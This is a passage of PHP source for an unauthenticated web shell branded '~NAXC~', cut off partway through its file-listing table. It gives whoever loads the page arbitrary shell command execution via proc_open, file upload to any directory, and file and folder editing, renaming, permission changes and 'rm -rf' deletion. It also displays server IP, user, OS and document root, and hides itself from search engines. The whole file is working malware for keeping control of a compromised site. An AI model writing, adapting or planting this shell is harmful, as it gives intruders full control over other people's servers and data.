<?php

$path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
$file = (isset($_GET["file"])) ? $_GET["file"] : "";

$os = php_uname('s');
$separator = ($os === 'Windows') ? "\\" : "/";
$explode = explode($separator, $path);

function ekse($coman, $serlok)
{
    $ler = "2>&1";
    if (!preg_match("/" . $ler . "/i", $coman)) {
        $coman = $coman . " " . $ler;
    }
    $komen = $coman;
    $pr = "proc_open";
    if (function_exists($pr)) {
        $tod = @$pr($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
        return true;
    } else {
        return false;
    }
}

function ipserv()
{
    if (empty($_SERVER['SERVER_ADDR'])) {
        return gethostbyname($_SERVER['SERVER_NAME']);
        if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
            return $_SERVER['SERVER_NAME'];
        }
    } else {
        return $_SERVER['SERVER_ADDR'];
    }
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow" />
    <title>~NAXC~</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
</head>

<body class="bg-gray-300 dark:bg-gray-900 text-gray-800 dark:text-gray-200">
    <?php
    if (!function_exists('proc_open')) {
        echo "<div class='bg-red-500 text-white p-4 text-center'>proc_open function is disabled!! In order to use this, proc_open must be enabled.</div>";
        exit;
    }
    ?>

    <div class="container mx-auto p-4">
        <div class="flex content-center items-center flex-col md:flex-row">
            <a href="?"><img src="https://naxtarrr.netlify.app/img/Naxtarrr.png" class="h-20 w-auto mt-2"></a>
            <form class="md:ms-auto max-w-lg mt-4" method="post" enctype="multipart/form-data">
                <input class="py-2.5 px-2 text-sm text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400" type="file" name="nax">
                <button class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="submit">
                    Submit
                </button>
            </form>

            <?php
            if (isset($_POST["submit"])) {
                $filename = basename($_FILES["nax"]["name"]);
                $tempname = $_FILES["nax"]["tmp_name"];
                $dest = $path . "/" . $filename;

                if (move_uploaded_file($tempname, $dest)) {
                    echo "<script>alert('File uploaded successfully');</script>";
                } else {
                    echo "<script>alert('Failed to upload file.');</script>";
                }
            }
            ?>
        </div>

        <div class="flex content-center mt-5 mb-10">
            <div class="inline-block mx-auto bg-gray-50 dark:bg-gray-700 p-4 text-sm text-center text-gray-500 dark:text-gray-400 rounded-lg overflow-auto">

                <?php
                if (isset($_GET["file"]) && !isset($_GET["path"])) {
                    $path = dirname($_GET["file"]);
                }
                $path = str_replace("\\", "/", $path);

                $paths = explode("/", $path);
                echo 'Path: ';
                echo (!preg_match("/Windows/", $os)) ? "<a class='hover:text-gray-600 dark:hover:text-gray-500' id='dir' href='?path=/'>~</a>" : "";
                foreach ($paths as $id => $pat) {
                    echo "<a class='hover:text-gray-600 dark:hover:text-gray-500' href='?path=";
                    for ($i = 0; $i <= $id; $i++) {
                        echo $paths[$i];
                        if ($i != $id) {
                            echo "/";
                        }
                    }
                    echo "'>$pat</a>/";
                }
                ?>
            </div>
        </div>

        <?php
        if (isset($_GET["action"]) && $_GET["action"] === "infomin") {
        ?>
            <div class="bg-gray-50 dark:bg-gray-700 p-4 rounded-lg">
                <h2 class="text-lg font-semibold mb-2">System Information</h2>
                <ul class="list-disc list-inside">
                    <li><strong>Server IP:</strong> <?= ipserv(); ?></li>
                    <li><strong>Server Software:</strong> <?= $_SERVER['SERVER_SOFTWARE'] ?? 'N/A'; ?></li>
                    <li><strong>PHP Version:</strong> <?= phpversion(); ?></li>
                    <li><strong>Current User:</strong> <?= get_current_user(); ?></li>
                    <li><strong>Operating System:</strong> <?= php_uname(); ?></li>
                    <li><strong>Document Root:</strong> <?= $_SERVER['DOCUMENT_ROOT'] ?? 'N/A'; ?></li>
                    <li><strong>Server Port:</strong> <?= $_SERVER['SERVER_PORT'] ?? 'N/A'; ?></li>
                    <li><strong>Server Admin:</strong> <?= $_SERVER['SERVER_ADMIN'] ?? 'N/A'; ?></li>
                    <li><strong>Loaded PHP Modules:</strong> <?= implode(", ", get_loaded_extensions()); ?></li>
                </ul>
            </div>
        <?php
        }

        if (isset($_GET["action"]) && $_GET["action"] === "command") {
        ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <div>
                        <label for="coman" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">Command:</label>
                        <input type="text" id="coman" name="coman" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" placeholder="ls -la">
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="execute">
                            Execute
                        </button>
                    </div>
                </div>
            </form>
            <?php
            if (isset($_POST["execute"])) {
                $coman = $_POST["coman"];
                if (empty($coman)) {
                    echo "<font color='red'>Command is empty</font>";
                } else {

                    echo "<font color='green'>Command: " . htmlspecialchars($coman) . "</font><br>";

                    $ler = "2>&1";
                    if (!preg_match("/" . $ler . "/i", $coman)) {
                        $coman = $coman . " " . $ler;
                    }
                    $komen = $coman;
                    $pr = "proc_open";
                    if (function_exists($pr)) {
                        $tod = @$pr($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $path);
                        echo "<pre><textarea rows='25' style='color:lime;' readonly='' class=' block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500'>
    " . htmlspecialchars(stream_get_contents($crottz[1])) . "</textarea></pre><br>";
                    } else {
                        echo "<font color='orange'>proc_open function is disabled!!</font>";
                    }
                }
            }
        }

        /* FILE ACTIONS */
        if (isset($_GET["path"]) && @$_GET["action"] === "newfile") {
            ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <div class="mb-4">
                        <label for="file_name" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">New File Name:</label>
                        <input type="text" id="file_name" name="file_name" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                    </div>
                    <div>
                        <label for="file_content" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">File Content:</label>
                        <textarea id="file_content" name="file_content" rows="12" class="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"></textarea>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="newfile">
                            Create file
                        </button>
                    </div>
                </div>
            </form>
            <?php
            if (isset($_POST["newfile"])) {
                $filename = $_POST["file_name"];
                $content = base64_encode($_POST["file_content"]);

                if (ekse("echo " . $content . " | base64 -d > " . $filename, $path)) {
                    echo "<script>alert('File created successfully.'); window.location.href='?path=" . urlencode($path) . "';</script>";
                } else {
                    echo "<script>alert('Failed to create file.');</script>";
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "view" && isset($_GET["file"])) {
            $filePath = $path . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath)) {
            ?>
                <div class='mt-4 text-gray-700 dark:text-gray-300'>
                    <h2 class='text-lg font-semibold'>File Content: <code><?= htmlspecialchars($_GET["file"]); ?></code></h2>
                    <textarea rows="12" class='block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white focus:outline-none' readonly><?= htmlspecialchars(file_get_contents($filePath)); ?></textarea>
                </div>
                <div class="flex gap-x-2 mt-2">
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=edit">Edit</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=renamefile">Rename</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=chmodfile">Chmod</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=deletefile">Delete</a>
                </div>
            <?php
            } else {
            ?>
                <div class='mt-4 text-red-600'>File does not exist or is not readable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "edit" && isset($_GET["file"])) {
            $filePath = $path . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath) && is_writable($filePath)) {
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <h2 class='text-lg font-semibold'>Edit File: <code><?= htmlspecialchars($_GET["file"]); ?></code></h2>
                        <textarea name="file_content" rows="12" class='block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white focus:outline-none'><?= htmlspecialchars(file_get_contents($filePath)); ?></textarea>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="editfile">
                            Save Changes
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["editfile"])) {
                    $content = base64_encode($_POST["file_content"]);

                    if (ekse("echo " . $content . " | base64 -d > " . $_GET["file"], $path)) {
                        echo "<script>alert('File updated successfully.'); window.location.href='?path=" . urlencode($path) . "&file=" . urlencode($_GET['file']) . "&action=edit';</script>";
                    } else {
                        echo "<script>alert('Failed to update file.');</script>";
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600'>File does not exist or is not writable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "renamefile" && isset($_GET["file"])) {
            $filePath = $path . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath) && is_writable($filePath)) {
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <h2 class='text-lg font-semibold'>Rename File: <code><?= htmlspecialchars($_GET["file"]); ?></code></h2>
                        <input type="text" name="new_name" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?= htmlspecialchars($_GET["file"]); ?>" required>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="renamefile">
                            Rename File
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["renamefile"])) {
                    $newName = $_POST["new_name"];
                    $newPath = $path . "/" . $newName;

                    if (rename($filePath, $newPath)) {
                        echo "<script>alert('File renamed successfully.'); window.location.href='?path=" . urlencode($_GET["path"]) . "&file=" . urlencode($newName) . "&action=renamefile';</script>";
                    } else {
                        echo "<script>alert('Failed to rename file.');</script>";
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600'>File does not exist or is not writable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "chmodfile" && isset($_GET["file"])) {
            $filePath = $path . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath) && is_writable($filePath)) {
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <h2 class='text-lg font-semibold'>Chmod File: <code><?= htmlspecialchars($_GET["file"]); ?></code></h2>
                        <input type="text" name="new_perms" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?= substr(sprintf('%o', @fileperms($filePath)), -4); ?>" required>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="chmodfile">
                            Change Permission
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["chmodfile"])) {
                    $newPerms = intval($_POST["new_perms"], 8);

                    if (chmod($filePath, $newPerms)) {
                        echo "<script>alert('File permissions changed successfully.'); window.location.href='?path=" . urlencode($_GET["path"]) . "&file=" . urlencode($_GET["file"]) . "&action=chmodfile';</script>";
                    } else {
                        echo "<script>alert('Failed to change file permissions.');</script>";
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600'>File does not exist or is not writable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "deletefile" && isset($_GET["file"])) {
            $filePath = $path . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath) && is_writable($filePath)) {
                if (unlink($filePath)) {
                    echo "<script>alert('File deleted successfully.'); window.location.href='?path=" . urlencode($path) . "';</script>";
                } else {
                    echo "<div class='mt-4 text-red-600'>Failed to delete file.</div>";
                }
            } else {
                echo "<div class='mt-4 text-red-600'>File does not exist or is not writable.</div>";
            }
        }
        /* END FILE ACTIONS */

        /* FOLDER ACTIONS */
        if (isset($_GET["path"]) && @$_GET["action"] === "newfolder") {
            ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <label for="folder_name" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">New Folder Name:</label>
                    <input type="text" id="folder_name" name="folder_name" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="newfolder">
                        Create folder
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["newfolder"])) {
                $folderName = $_POST["folder_name"];
                $folderPath = $path . "/" . $folderName;

                if (mkdir($folderPath, 0777, true)) {
                    echo "<script>alert('Folder created successfully.'); window.location.href='?path=" . urlencode($path) . "';</script>";
                } else {
                    echo "<script>alert('Failed to create folder.');</script>";
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "renamefolder" && isset($_GET["folder"])) {
            $folderPath = $path . "/" . $_GET["folder"];
            if (file_exists($folderPath) && is_dir($folderPath) && is_writable($folderPath)) {
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <h2 class='text-lg font-semibold'>Rename Folder: <code><?= htmlspecialchars($_GET["folder"]); ?></code></h2>
                        <input type="text" name="new_name" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?= htmlspecialchars($_GET["folder"]); ?>" required>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="renamefolder">
                            Rename Folder
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["renamefolder"])) {
                    $newName = $_POST["new_name"];
                    $newPath = $path . "/" . $newName;

                    if (rename($folderPath, $newPath)) {
                        echo "<script>alert('Folder renamed successfully.'); window.location.href='?path=" . urlencode($_GET["path"]) . "&folder=" . urlencode($newName) . "&action=renamefolder';</script>";
                    } else {
                        echo "<script>alert('Failed to rename folder.');</script>";
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600'>Folder does not exist or is not writable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "chmodfolder" && isset($_GET["folder"])) {
            $folderPath = $path . "/" . $_GET["folder"];
            if (file_exists($folderPath) && is_dir($folderPath) && is_writable($folderPath)) {
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <h2 class='text-lg font-semibold'>Chmod Folder: <code><?= htmlspecialchars($_GET["folder"]); ?></code></h2>
                        <input type="text" name="new_perms" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" value="<?= substr(sprintf('%o', @fileperms($folderPath)), -4); ?>" required>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="chmodfolder">
                            Change Permission
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["chmodfolder"])) {
                    $newPerms = intval($_POST["new_perms"], 8);

                    if (chmod($folderPath, $newPerms)) {
                        echo "<script>alert('Folder permissions changed successfully.'); window.location.href='?path=" . urlencode($_GET["path"]) . "&folder=" . urlencode($_GET["folder"]) . "&action=chmodfolder';</script>";
                    } else {
                        echo "<script>alert('Failed to change folder permissions.');</script>";
                    }
                }
            } else {
                ?>
                <div class='mt-4 text-red-600'>Folder does not exist or is not writable.</div>
        <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "deletefolder" && isset($_GET["folder"])) {
            $folderPath = $path . "/" . $_GET["folder"];
            if (file_exists($folderPath) && is_dir($folderPath) && is_writable($folderPath)) {
                if (ekse("rm -rf " . $_GET["folder"], $path)) {
                    echo "<script>alert('Folder deleted successfully.'); window.location.href='?path=" . urlencode($path) . "';</script>";
                } else {
                    echo "<div class='mt-4 text-red-600'>Failed to delete folder. Make sure the folder is empty or you have the necessary permissions.</div>";
                }
            } else {
                echo "<div class='mt-4 text-red-600'>Folder does not exist or is not writable.</div>";
            }
        }
        /* END FOLDER ACTIONS */
        ?>

        <!-- TABLE DISPLAY -->
        <div class="flex mt-4.5">
            <a class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 p-3 rounded-tl-lg br-8 hover:scale-110 duration-300 ease-in-out" href="?path=<?= $path; ?>&action=newfile">
                <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7 7V5" />
                </svg>
                <span>FILE</span>
            </a>
            <a class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 p-3 hover:scale-110 duration-300 ease-in-out" href="?path=<?= $path; ?>&action=newfolder">
                <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7 7V5" />
                </svg>
                <span>DIR</span>
            </a>
            <a class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 p-3 hover:scale-110 duration-300 ease-in-out" href="?path=<?= $path; ?>&action=infomin">
                <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 11h2v5m-2 0h4m-2.592-8.5h.01M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Z" />
                </svg>
                <span>INFO</span>
            </a>
            </a>
            <a class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 p-3 rounded-tr-lg bl-8 hover:scale-110 duration-300 ease-in-out" href="?path=<?= $path; ?>&action=command">
                <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m8 9 3 3-3 3m5 0h3M4 19h16a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1H4a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1Z" />
                </svg>
                <span>CMD</span>
            </a>
        </div>
        <div class="relative overflow-x-auto shadow-md rounded-br-lg rounded-bl-lg rounded-tr-lg">
            <table class="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
                <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                    <tr>
                        <th class="px-6 py-3">Name</th>
                        <th class="px-6 py-3">Size</th>
                        <th class="px-6 py-3">Permission</th>
                        <th class="px-6 py-3">Action</th>
                    </tr>
                </thead>
                <?php if (is_readable($path)): ?>
                    <tbody>
                        <?php
                        $files = scandir($path);
                        foreach ($files as $file) {
                            if ($file === '.' || $file === '..' || is_file($path . DIRECTORY_SEPARATOR . $file)) continue;

                            $filePath = $path . DIRECTORY_SEPARATOR . $file;
                            $filePerms = substr(sprintf('%o', @fileperms($filePath)), -4);
                        ?>
                            <tr class='bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600'>
                                <td class='px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white'>
                                    <a class="flex items-center gap-x-1 " href="?path=<?= urlencode($path . DIRECTORY_SEPARATOR . $file); ?>">
                                        <svg class="w-6 h-6 text-gray-800 dark:text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M3 6a2 2 0 0 1 2-2h5.532a2 2 0 0 1 1.536.72l1.9 2.28H3V6Zm0 3v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9H3Z" clip-rule="evenodd" />
                                        </svg>
                                        <span><?= $file; ?></span>
                                    </a>
                                </td>
                                <td class='px-6 py-4'>---</td>
                                <td class='px-6 py-4 <?php if (is_writable($filePath)): ?> text-green-400 <?php endif; ?>'><?= $filePerms; ?></td>
                                <td class='px-6 py-4 flex gap-x-1'>
                                    <!-- Folder Rename Action -->
                                    <a href="?path=<?= $path ?>&folder=<?= urlencode($file); ?>&action=renamefolder" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28" />
                                        </svg>
                                    </a>
                                    <!-- Folder Chmod Action -->
                                    <a href="?path=<?= $path ?>&folder=<?= urlencode($file); ?>&action=chmodfolder" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 8v8m0-8h8M8 8H6a2 2 0 1 1 2-2v2Zm0 8h8m-8 0H6a2 2 0 1 0 2 2v-2Zm8 0V8m0 8h2a2 2 0 1 1-2 2v-2Zm0-8h2a2 2 0 1 0-2-2v2Z" />
                                        </svg>
                                    </a>
                                    <!-- Folder Delete Action -->
                                    <a href="?path=<?= $path ?>&folder=<?= urlencode($file); ?>&action=deletefolder" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd" />
                                        </svg>
                                    </a>
                                </td>
                            </tr>
                        <?php } ?>
                    </tbody>

                    <tbody>
                        <?php
                        foreach ($files as $file) {
                            if ($file === '.' || $file === '..' || is_dir($path . DIRECTORY_SEPARATOR . $file)) continue;

                            $filePath = $path . DIRECTORY_SEPARATOR . $file;
                            $fileSize = @filesize($filePath);
                            $filePerms = substr(sprintf('%o', @fileperms($filePath)), -4);
                        ?>
                            <tr class='bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600'>
                                <td class='px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white'>
                                    <a class="flex items-center gap-x-1 " href="?path=<?= urlencode($path); ?>&file=<?= urlencode($file); ?>&action=view">
                                        <svg class="w-6 h-6 text-gray-800 dark:text-blue-300" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M9 2.221V7H4.221a2 2 0 0 1 .365-.5L8.5 2.586A2 2 0 0 1 9 2.22ZM11 2v5a2 2 0 0 1-2 2H4v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2h-7Z" clip-rule="evenodd" />
                                        </svg>
                                        <span><?= $file; ?></span>
                                    </a>
                                </td>
                                <td class='px-6 py-4'><?= $fileSize; ?> bytes</td>
                                <td class='px-6 py-4 <?php if (is_writable($filePath)): ?> text-green-400 <?php endif; ?>'><?= $filePerms; ?></td>
                                <td class='px-6 py-4 flex gap-x-1'>
                                    <!-- File Edit Action -->
                                    <a href="?path=<?= $path; ?>&file=<?= urlencode($file); ?>&action=edit" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M11.32 6.176H5c-1.105 0-2 .949-2 2.118v10.588C3 20.052 3.895 21 5 21h11c1.105 0 2-.948 2-2.118v-7.75l-3.914 4.144A2.46 2.46 0 0 1 12.81 16l-2.681.568c-1.75.37-3.292-1.263-2.942-3.115l.536-2.839c.097-.512.335-.983.684-1.352l2.914-3.086Z" clip-rule="evenodd" />
                                            <path fill-rule="evenodd" d="M19.846 4.318a2.148 2.148 0 0 0-.437-.692 2.014 2.014 0 0 0-.654-.463 1.92 1.92 0 0 0-1.544 0 2.014 2.014 0 0 0-.654.463l-.546.578 2.852 3.02.546-.579a2.14 2.14 0 0 0 .437-.692 2.244 2.244 0 0 0 0-1.635ZM17.45 8.721 14.597 5.7 9.82 10.76a.54.54 0 0 0-.137.27l-.536 2.84c-.07.37.239.696.588.622l2.682-.567a.492.492 0 0 0 .255-.145l4.778-5.06Z" clip-rule="evenodd" />
                                        </svg>
                                    </a>
                                    <!-- File Rename Action -->
                                    <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=renamefile" class='text-blue-600 hover:underline'>
